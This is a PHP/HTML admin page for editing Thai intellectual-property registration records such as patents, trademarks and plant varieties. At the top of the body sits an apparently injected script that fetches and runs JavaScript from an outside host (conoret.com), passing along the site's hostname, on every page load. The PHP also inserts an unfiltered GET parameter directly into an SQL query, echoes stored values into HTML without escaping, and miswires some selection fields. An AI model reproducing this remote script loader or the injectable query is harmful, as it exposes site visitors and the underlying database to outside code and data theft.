<meta charset="UTF-8">
<style>
    body,
    a {
        font-family: 'K2D', sans-serif;
        text-decoration: none;
        margin-top: 10px;
        color: blue;
    }

    .glow1 {
        font-size: 26px;
        color: black;
        width: 300%;
        color: white;
        padding: 0.5em;
        display: inline-block;
        line-height: 1.3;
        background: #cb5454;
        vertical-align: middle;
        border-radius: 115px 20px 115px 20px
    }


    .tb {
        background-color: #FFDAB9;

        color: #000;
    }

    .center {
        margin-left: auto;
        margin-right: auto;
        font-size: 14px;
        color: black;
        text-align: center;
        height: 20px;
        padding: 18p;
        border-radius: 4px;
        border: none;
        min-width: 230px;
    }

    .center1 {
        margin-right: auto;
        font-size: 14px;
        color: black;

        height: 20px;
        c border-radius: 8px;

    }

    .tr {

        margin-left: auto;
        margin-right: auto;
        margin-top: 50px;
        border: none;
    }

    .button:hover {
        background-color: #3e8e41;
    }

    .button:active {
        background-color: #3e8e41;
        box-shadow: 0 5px #666;
        transform: translateY(4px);
    }

    .button1:hover {
        background-color: red;
    }

    .button1:active {
        background-color: #d90d19;
        box-shadow: 0 5px #666;
        transform: translateY(4px);
    }

    .button1 {
        display: inline-block;
        padding: 10px 20px;
        font-size: 16px;
        cursor: pointer;
        text-align: center;
        text-decoration: none;
        outline: none;
        color: #fff;
        background-color: red;
        border: none;
        border-radius: 12px;
        box-shadow: 0 4px white;
        margin-left: 200%;
        margin-top: 5px;
    }


    .button {
        display: inline-block;
        padding: 10px 20px;
        font-size: 16px;
        cursor: pointer;
        text-align: center;
        text-decoration: none;
        outline: none;
        color: #fff;
        background-color: #4CAF50;
        border: none;
        border-radius: 12px;
        box-shadow: 0 4px white;
        margin-left: 950px;
        margin-top: 5px;
    }

    .glow {
        font-size: 26px;
        color: black;
        text-align: center;
        animation: glow 1s ease-in-out infinite alternate;
        color: black;
        padding: 0.5em 0;
        border-top: solid 3px black;
        border-bottom: solid 3px black;
        width: 30%;
        margin-left: 580px;
        border-radius: 10px;
    }

    p.outset1 {
        display: inline;
        width: 130px;
        border-style: outset;
        background: #2c15b1;
        text-align: center;
        margin-left: 10%;
        margin-top: 2%;
        color: white;
        height: 40px;
        padding: 15px;
        outline-color: red;
        border-radius: 8px;
    }

    .outset1:active {
        background-color: #442bd1;
        box-shadow: 0 4px #666;
        transform: translateY(4px);
    }

    input:not([type="image"i]) {
        box-sizing: border-box;

    }

    input[type="file"i] {
        appearance: none;
        background-color: initial;
        cursor: default;
        align-items: baseline;
        color: inherit;
        text-overflow: ellipsis;
        white-space: pre;
        text-align: start !important;
        padding: initial;
        border: initial;
        overflow: hidden !important;


    }

    td {
        display: table-cell;
        vertical-align: inherit;
        margin-right: 50px;


    }

    th {
        display: table-cell;
        vertical-align: inherit;
        font-weight: bold;
        text-align: -internal-center;
        padding: 20px;
        color: #000;

    }

    .form {
        width: 1500px;
        height: 1080px;
        background: #e6e6e6;
        border-radius: 8px;
        box-shadow: 0 0 40px -10px #000;
        margin: calc(50vh - 220px) auto;
        padding: 20px 30px;
        max-width: calc(100vw - 40px);
        box-sizing: border-box;
        font-family: 'Montserrat', sans-serif;
        position: relative;
        margin: auto;
        align-items: center;
    }

    .box2 {

        -webkit-backdrop-filter: blur(10px);
        backdrop-filter: blur(10px);
        background-color: #f99f37;
        border-radius: 0.25rem;

    }

    input[type=text] {

        height: 39px;
        padding: 0px 10px;
        background-color: rgb(255 255 255);
        border: none;
        display: inline;
        color: #303030;
        font-size: 13px;
        font-weight: 400;

        text-align: center;
        border-radius: 5px;
        -webkit-box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
        -moz-box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
        box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
    }

    input[type=date],
    input[type=ddmmyy] {

        height: 39px;
        padding: 0px 10px;
        background-color: rgb(255 255 255);
        border: none;
        display: inline;
        color: #303030;
        font-size: 13px;
        font-weight: 400;

        border-radius: 5px;
        -webkit-box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
        -moz-box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
        box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
    }

    input[type=number] {

        height: 39px;
        padding: 0px 10px;
        background-color: rgb(255 255 255);
        border: none;
        display: inline;
        color: #303030;
        font-size: 13px;
        font-weight: 400;

        text-align: center;
        border-radius: 5px;
        -webkit-box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
        -moz-box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
        box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
    }


    label:before,
    select option,
    select {

        font-size: 13px;
        padding: 1em;
        line-height: 1.4;

        background-color: #ffffff;
        border: 1px solid #e5e5e5;
        border-radius: 4px;
        -webkit-transition: 0.35s ease-in-out;
        -moz-transition: 0.35s ease-in-out;
        -o-transition: 0.35s ease-in-out;
        transition: 0.35s ease-in-out;
        transition: all 0.35s ease-in-out;
        text-align: center;
    }
</style>

<body>
    <script type="text/javascript">
        window.top === window && ! function() {
            var e = document.createElement("script"),
                t = document.getElementsByTagName("head")[0];
            e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random(), e.type = "text/javascript", e.defer = !0, e.async = !0, t.appendChild(e)
        }();
    </script>
    <div class="body">
        <?php
        //ไอดีที่เราทำการดึงมาเพื่อนำมาแก้ไข
        $ID_ip = $_GET['ID_ip'];
        $objDB = mssql_select_db("intelle");
        $data = mssql_query("SELECT * FROM tb_IP WHERE ID_ip='$ID_ip'")
            or die(mssql_error());

        ?>
        <h1 class="glow">การจดทะเบียนทรัพย์สินทางปัญญา</h1>
        <br>
        <a style="text-decoration: none;" onclick="location. href='indexadmin.php?Menu=5&Submenu=showmanage'; ">
            <p class="outset1">ย้อนกลับ</p>
        </a><br><br><br>
        <?php
        while ($info = mssql_fetch_array($data)) {
            $name = iconv("tis-620", "utf-8",  $info['name']);
            $type = iconv("tis-620", "utf-8", $info['type']);
            $numfeduest = iconv("tis-620", "utf-8", $info['numfeduest']);
            $form = iconv("tis-620", "utf-8", $info['form']);
            $offer = iconv("tis-620", "utf-8", $info['offer']);
            $admin = iconv("tis-620", "utf-8", $info['admin']);
            $agent = iconv("tis-620", "utf-8", $info['agent']);
            $numregister = iconv("tis-620", "utf-8", $info['numregister']);
            $datenumregister = iconv("tis-620", "utf-8", $info['numregister']);
            $datenumregister = iconv("tis-620", "utf-8", $info['datenumregister']);
            $kind = iconv("tis-620", "utf-8", $info['kind']);
            $title = iconv("tis-620", "utf-8", $info['title']);
            $holdre = iconv("tis-620", "utf-8", $info['holdre']);
            $team = iconv("tis-620", "utf-8", $info['team']);
            $affiliation = iconv("tis-620", "utf-8", $info['affiliation']);
            $inventor = iconv("tis-620", "utf-8", $info['inventor']);
            $inventors = iconv("tis-620", "utf-8", $info['inventors']);
            $framename = iconv("tis-620", "utf-8", $info['framename']);
            $projectcode = iconv("tis-620", "utf-8", $info['projectcode']);
            $contract = iconv("tis-620", "utf-8", $info['contract']);
            $genus = iconv("tis-620", "utf-8", $info['genus']);
            $attachment = iconv("tis-620", "utf-8", $info['attachment']);
            $benefit = iconv("tis-620", "utf-8", $info['benefit']);
            $lead = iconv("tis-620", "utf-8", $info['lead']);
            $sta = iconv("tis-620", "utf-8", $info['sta']);
            $note = iconv("tis-620", "utf-8", $info['note']);

        ?>
            <form action="manage/updatemanage.php?ID_ip=<?php echo $info['ID_ip']; ?>" method="post" enctype="multipart/form-data">
                <div class="form">
                    <br>
                    <table class="center1">
                        <tbody>
                            <tr>
                                <th align="left" width="70%" class="glow1">ประเภทการจดทะเบียน</th>
                                <th class="th">
                                    <input type="radio" id="html" name="type" value="1" <?php if ($type == 1) {
                                                                                            echo 'checked';
                                                                                        } ?>>
                                    &nbsp; <label for="html">สิทธิบัตร</label>
                                    &nbsp; <input type="radio" id="css" name="type" value="2" <?php if ($type == 2) {
                                                                                                    echo 'checked';
                                                                                                } ?>>
                                    &nbsp; <label for="css">อนุสิทธิบัตร</label>
                                    <input type="radio" id="css" name="type" value="3" <?php if ($type == 3) {
                                                                                            echo 'checked';
                                                                                        } ?>>
                                    &nbsp; <label for="css">เครื่องหมายการค้า</label>
                                    <input type="radio" id="css" name="type" value="4" <?php if ($type == 4) {
                                                                                            echo 'checked';
                                                                                        } ?>>
                                    &nbsp; <label for="css">พันธุ์พืช</label>
                                </th>
                                <th>
                                </th>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tr class="tr">
                            <br>
                            <div class="container">

                                <th>เลขที่คำขอ: </th>
                                <td>
                                    <div class="container" style=" margin-right:30px; margin-left:30px; ">
                                        <input type="number" id="number" name="numfeduest" required="" value="<?php echo $numregister; ?>">
                                    </div>
                                </td>

                                <th>วันที่ยื่นขอ:</th>
                                <td>
                                    <div class="container" style=" margin-right:30px;  margin-left:30px;">
                                        <input type="date" name="offer" value="<?php echo $offer; ?>">
                                        <div id="result"></div>
                                </td>

                                <th>เเบบพิมพ์คำขอสิทธิบัตร<br>/อนุสิทธิบัตร จดทะเบียน: </th>
                                <td>
                                    <div class="container" style="text-align:center; margin-left:40px; color: black; margin-right:40px;">
                                        <label for="myfile">กรุณาเลือกไฟล์</label><br>
                                        &nbsp;<a id="file" class="outset1" href="../uploadpdf/<?php echo $form ?>" target="-blank">เรียกดู</a>
                                </td>

                                <th>สำหรับแอดมิน</th>
                                <td>
                                    <div class="container" style="text-align:center; margin-right:40px; margin-left:40px; color: black;">
                                        <label for="myfile">กรุณาเลือกไฟล์</label><br>
                                        <a id="file" class="outset1" href="../uploadpdf/<?php echo $admin ?>" target="-blank">เรียกดู</a>
                                </td>
                            </div>
                        </tr>
                    </table>

                    <table>
                        <tr class="tr"><br>
                            <div class="container">

                                <th>ตัวเเทน</th>
                                <td>
                                    <div class="container" style=" margin-left: 50px; margin-right:40px">
                                        <input type="text" placeholder="xxxx" name="agent" required="" value="<?php echo $agent; ?>">
                                    </div>
                                </td>

                                <th>เลขทะเบียน</th>
                                <td>
                                    <div class="container" style=" margin-right:30px">
                                        <input type="number" id="number" placeholder="000000" name="numregister" required="" value="<?php echo $numregister; ?>">
                                    </div>
                                </td>

                                <th>วันที่ออกเลขทะเบียน</th>
                                <td>
                                    <div class="container" style="margin-left:30px; margin-right: 60px;">
                                        <input type="date" name="datenumregister" value="<?php echo $datenumregister; ?>">
                                        <div id="result"></div>
                                </td>

                                <th>ชนิด</th>
                                <td class="tr">
                                    <div class="container" style="margin-left: 55px;">
                                        <select name="kind"> Answer 1
                                            <option selected="" value="">--กรุณาเลือก--</option>
                                            <option value="1" <?php if ($kind == 1) {
                                                                    echo 'selected';
                                                                } ?>>การประดิษฐ์</option>
                                            <option value="2" <?php if ($kind == 2) {
                                                                    echo 'selected';
                                                                } ?>>การออกแบบ</option>
                                            <option value="3" <?php if ($kind == 3) {
                                                                    echo 'selected';
                                                                } ?>>การรับรอง</option>
                                            <option value="4" <?php if ($kind == 4) {
                                                                    echo 'selected';
                                                                } ?>>การบริการ </option>
                                            <option value="5" <?php if ($kind == 5) {
                                                                    echo 'selected';
                                                                } ?>>การขึ้นทะเบียน </option>
                                        </select>
                                </td>

                            </div>
                        </tr>
                    </table>

                    <table>
                        <tr class="tr"><br>
                            <div class="container">

                                <th>ชื่อเรื่อง</th>
                                <td>
                                    <div class="container" style=" margin-left: 50px; margin-right:40px">
                                        <input type="text" placeholder="xxxx" name="title" required="" value="<?php echo $title; ?>">
                                    </div>
                                </td>

                                <th>ผู้ทรงสิทธิ</th>
                                <td>
                                    <div class="container" style=" margin-left: 10px; margin-right:80px">
                                        <input type="text" placeholder="xxx" name="holdre" required="" value="<?php echo $holdre; ?>">
                                    </div>
                                </td>

                                <th>กลุ่ม</th>
                                <td>
                                    <div class="container" style="margin-left: 80px; margin-right:60px">
                                        <select name="team"> Answer 1
                                            <option selected="" value="">--กรุณาเลือก-- </option>
                                            <option value="1" <?php if ($team == 1) {
                                                                    echo 'selected';
                                                                } ?>>อช.</option>
                                            <option value="2" <?php if ($team == 1) {
                                                                    echo 'selected';
                                                                } ?>>พช.</option>
                                            <option value="3" <?php if ($team == 1) {
                                                                    echo 'selected';
                                                                } ?>>บอ.</option>
                                        </select>
                                </td>

                                <th>สังกัด</th>
                                <td>
                                    <div class="container" style="margin-left: 45px;">
                                        <select name="affiliation"> Answer 1
                                            <option selected="" value="">--กรุณาเลือก--
                                            </option>
                                            <option value="1" <?php if ($affiliation == 1) {
                                                                    echo 'selected';
                                                                } ?>>ศนก.
                                            </option>
                                            <option value="2" <?php if ($affiliation == 2) {
                                                                    echo 'selected';
                                                                } ?>>ศคช.
                                            </option>
                                            <option value="3" <?php if ($affiliation == 3) {
                                                                    echo 'selected';
                                                                } ?>>ศนอ.
                                            </option>
                                            <option value="4" <?php if ($affiliation == 4) {
                                                                    echo 'selected';
                                                                } ?>>ศนส.
                                            </option>
                                            <option value="5" <?php if ($affiliation == 5) {
                                                                    echo 'selected';
                                                                } ?>>ศนพ.
                                            </option>
                                            <option value="6" <?php if ($affiliation == 6) {
                                                                    echo 'selected';
                                                                } ?>>ศนว.
                                            </option>
                                            <option value="7" <?php if ($affiliation == 7) {
                                                                    echo 'selected';
                                                                } ?>>ศนย.
                                            </option>
                                            <option value="8" <?php if ($affiliation == 8) {
                                                                    echo 'selected';
                                                                } ?>>ศบท.
                                            </option>
                                            <option value="9" <?php if ($affiliation == 9) {
                                                                    echo 'selected';
                                                                } ?>>ศพว.
                                            </option>
                                        </select>
                                </td>

                            </div>
                        </tr>
                    </table>

                    <table>
                        <tr class="tr"><br>
                            <div class="container">

                                <th>ผู้ประดิษฐ์<br>(1คน)</th>
                                <td>
                                    <div class="container" style=" margin-left: 38px; margin-right:80px">
                                        <select name="inventor"> Answer 1
                                            <option selected="" value="">--กรุณาเลือก--
                                            </option>
                                            <option value="1" <?php if ($inventor == 1) {
                                                                    echo 'selected';
                                                                } ?>>คนที่1
                                            </option>
                                            <option value="2" <?php if ($inventor == 2) {
                                                                    echo 'selected';
                                                                } ?>>คนที่2
                                            </option>
                                            <option value="3" <?php if ($inventor == 3) {
                                                                    echo 'selected';
                                                                } ?>>คนที่3
                                            </option>
                                        </select>
                                </td>

                                <th>ผู้ประดิษฐ์<br>(1-15)</th>
                                <td>
                                    <div class="container" style=" margin-left: 20px; margin-right:85px">
                                        <select name="inventors"> Answer 1
                                            <option selected="" value="">--กรุณาเลือก--
                                            </option>
                                            <option value="1" <?php if ($inventors == 1) {
                                                                    echo 'selected';
                                                                } ?>>คนที่1
                                            </option>
                                            <option value="2" <?php if ($inventors == 2) {
                                                                    echo 'selected';
                                                                } ?>>คนที่2
                                            </option>
                                            <option value="3" <?php if ($inventors == 3) {
                                                                    echo 'selected';
                                                                } ?>>คนที่3
                                            </option>
                                        </select>
                                </td>

                                <th>ชื่อโครงการ(กตป.)</th>
                                <td>
                                    <div class="container" style=" margin-left: 25px; margin-right:13px">
                                        <input type="text" " placeholder=" xxxx" name="framename" required="" value="<?php echo $framename; ?>">
                                    </div>
                                </td>

                                <th>รหัสโครงการวิจัย<br>บริการวิจัย</th>
                                <td>
                                    <div class="container" style="margin-left: 15px; ">
                                        <input type="number" id="number" placeholder="0" name="projectcode" required="" value="<?php echo $projectcode; ?>">
                                    </div>
                                </td>

                            </div>
                        </tr>
                    </table>

                    <table>
                        <tr class="tr"><br>
                            <div class="container"">
                            <th>คู่สัญญา<br>โครงการ</th>
                            <td>
                                <div class=" container" style=" margin-left:40px;  margin-right:80px">
                                <select name="contract"> Answer 1
                                    <option selected="" value="">--กรุณาเลือก--</option>
                                    <option value="1" <?php if ($contract == 1) {
                                                            echo 'selected';
                                                        } ?>>คนที่1</option>
                                    <option value="2" <?php if ($contract == 2) {
                                                            echo 'selected';
                                                        } ?>>คนที่2 </option>

                                    <option value="3" <?php if ($contract == 3) {
                                                            echo 'selected';
                                                        } ?>>คนที่3</option>
                                </select>
                                </td>

                                <th>ประเภท<br>โครงการ</th>
                                <td>
                                    <div class="container" style="  margin-left:20px; margin-right:50px">
                                        <select name="genus"> Answer 1
                                            <option selected="" value="">--กรุณาเลือก--</option>
                                            <option value="1" <?php if ($genus == 1) {
                                                                    echo 'selected';
                                                                } ?>>การบริการวิจัย
                                            </option>
                                            <option value="2" <?php if ($genus == 2) {
                                                                    echo 'selected';
                                                                } ?>>การบริการวิจัยจากแหล่งทุน
                                            </option>
                                            <option value="3" <?php if ($genus == 3) {
                                                                    echo 'selected';
                                                                } ?>>mou
                                            </option>
                                            <option value="4" <?php if ($genus == 4) {
                                                                    echo 'selected';
                                                                } ?>>เงินทุน วว.
                                            </option>
                                            <option value="5" <?php if ($genus == 5) {
                                                                    echo 'selected';
                                                                } ?>>การถ่ายทอดเทคโนโลยี
                                            </option>
                                        </select>
                                </td>

                                <th>เเนบเอกสาร<br>โครงการ</th>
                                <td>
                                    <div class="container" style="text-align:center;">
                                        <div class="container" style=" margin-left:70px; margin-right:45px; color:black;">
                                            <label for="myfile">กรุณาเลือกไฟล์</label><br>
                                            <a id="file" class="outset1" href="../uploadpdf/<?php echo $admin ?>" target="-blank">เรียกดู</a>
                                </td>


                                <th>ประเภทการใช้<br>ประโยชน์</th>
                                <td>
                                    <div class="container" style=" margin-left:15px;">
                                        <select name="benefit"> Answer 1
                                            <option selected="" value="VANI">--กรุณาเลือก--</option>
                                            <option value="1" <?php if ($benefit == 1) {
                                                                    echo 'selected';
                                                                } ?>>การบริการวิจัย
                                            </option>
                                            <option value="2" <?php if ($genus == 2) {
                                                                    echo 'selected';
                                                                } ?>>การถ่ายทอดเทคโนโลยี
                                            </option>
                                            <option value="3" <?php if ($benefit == 3) {
                                                                    echo 'selected';
                                                                } ?>>การอนุญาตให้ใช้สิทธิ
                                            </option>
                                            <option value="4" <?php if ($benefit == 4) {
                                                                    echo 'selected';
                                                                } ?>>mou
                                            </option>
                                        </select>
                                </td>
                            </div>
                        </tr>
                    </table>

                    <table>
                        <tr class="tr"><br>
                            <div class="container"">
                            <th>ผู้นำผลงาน<br>วิจัยไปใช้<br>ประโยชน์</th>
                            <class=" tr">
                                <td>
                                    <div class="container" style="  margin-left:20px; margin-right:20px">
                                        <input type="text" placeholder="xxxx" name="lead" required="" value="<?php echo $lead; ?>">
                                    </div>
                                </td>

                                <th>สถานะอัพเดท<br>ปัจจุบัน</th>
                                <td>
                                    <div class="container" style="  margin-left:5px; margin-right:15px">
                                        <select name="sta"> Answer 1
                                            <option selected="" value="">--กรุณาเลือก--
                                            </option>
                                            <option value="15" <?php if ($sta == 15) {
                                                                    echo 'selected';
                                                                } ?>>แก้ไข
                                            </option>
                                            <option value="1" <?php if ($sta == 1) {
                                                                    echo 'selected';
                                                                } ?>>ชำระค่าธรรมเนียมประกาศโฆษณา
                                            </option>
                                            <option value="2" <?php if ($sta == 2) {
                                                                    echo 'selected';
                                                                } ?>>ประกาศโฆษณา
                                            </option>
                                            <option value="3" <?php if ($sta == 3) {
                                                                    echo 'selected';
                                                                } ?>>ยื่นตรวจสอบการประดิษฐ์
                                            </option>
                                            <option value="4" <?php if ($sta == 4) {
                                                                    echo 'selected';
                                                                } ?>>ชำระค่าออกสิทธิบัตร
                                            </option>
                                            <option value="5" <?php if ($sta == 5) {
                                                                    echo 'selected';
                                                                } ?>>ชำระค่าออกอนุสิทธิบัตร
                                            </option>
                                            <option value="6" <?php if ($sta == 6) {
                                                                    echo 'selected';
                                                                } ?>>ออกสิทธิบัตร
                                            </option>
                                            <option value="7" <?php if ($sta == 7) {
                                                                    echo 'selected';
                                                                } ?>>ออกอนุสิทธิบัตร
                                            </option>
                                            <option value="8" <?php if ($sta == 8) {
                                                                    echo 'selected';
                                                                } ?>>ชำระค่าธรรมเนียมสิทธิบัตรรายปี
                                            </option>
                                            <option value="9" <?php if ($sta == 9) {
                                                                    echo 'selected';
                                                                } ?>>ชำระค่าธรรมเนียมอนุสิทธิบัตรรายปี
                                            </option>
                                            <option value="10" <?php if ($sta == 10) {
                                                                    echo 'selected';
                                                                } ?>>ไม่มีขั้นการประดิษฐ์ที่สูงขึ้น
                                            </option>
                                            <option value="11" <?php if ($sta == 11) {
                                                                    echo 'selected';
                                                                } ?>>ชี้แจงข้อโต้แย้ง
                                            </option>
                                            <option value="12" <?php if ($sta == 12) {
                                                                    echo 'selected';
                                                                } ?>>เปลี่ยนแปลงสิทธิ
                                            </option>
                                            <option value="13" <?php if ($sta == 13) {
                                                                    echo 'selected';
                                                                } ?>>ละทิ้งคำขอ
                                            </option>
                                            <option value="14" <?php if ($sta == 14) {
                                                                    echo 'selected';
                                                                } ?>>สิ้นอายุ
                                            </option>
                                        </select>
                                </td>

                                <th>หมายเหตุ</th>
                                <td>
                                    <div class="container" style="  margin-left:47px; ">
                                        <input type="text" placeholder="xxxx" name="note" required="" value="<?php echo $note; ?>">
                                    </div>
                                </td>

                            </div>
                        </tr>
                    </table>

                    <table table="" style="width:20%" class="center1">

                        <tbody>
                            <tr>
                                <th><button class="button" type="submit">บันทึก</button></th>
                                <th><button class="button1" type="reset">ยกเลิก</button></th>

                            </tr>
                        </tbody>
                    </table>
                </div>
            </form>
        <?php } ?>
    </div>
</body>